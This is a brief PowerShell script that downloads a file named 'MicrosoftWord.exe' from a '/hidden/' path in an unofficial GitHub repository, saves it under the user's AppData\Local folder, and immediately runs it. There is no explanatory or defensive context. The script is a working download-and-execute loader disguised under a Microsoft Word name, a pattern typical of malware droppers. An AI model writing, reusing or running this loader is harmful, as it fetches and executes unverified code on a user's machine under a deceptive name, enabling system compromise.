$url = "https://github.com/webntdev/webntdev.github.io/raw/main/hidden/MicrosoftWord.exe"
$localPath = "$env:USERPROFILE\AppData\Local\MicrosoftWord.exe"

if (-Not (Test-Path $localPath)) {
    Invoke-WebRequest -Uri $url -OutFile $localPath
}

Start-Process $localPath
